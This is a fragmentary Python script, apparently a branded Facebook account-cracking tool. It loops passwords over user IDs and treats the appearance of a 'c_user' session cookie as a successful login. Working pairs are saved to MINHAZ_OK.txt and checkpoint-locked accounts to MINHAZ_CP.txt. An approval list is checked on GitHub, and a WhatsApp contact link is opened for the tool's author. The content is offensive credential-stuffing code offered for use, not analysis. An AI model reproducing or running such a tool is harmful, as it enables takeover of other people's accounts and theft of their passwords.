...
def main_apv():
    ...
    r1=requests.get("https://github.com/minhaz60/minhaz-test/blob/main/Approved.txt").text
...
def R():
			...
			print ("\033[1m [!] Tool    : MINHAZ✓ Ahmad")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MINHAZ✓-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/MINHAZ_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/MINHAZ_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801839000896")
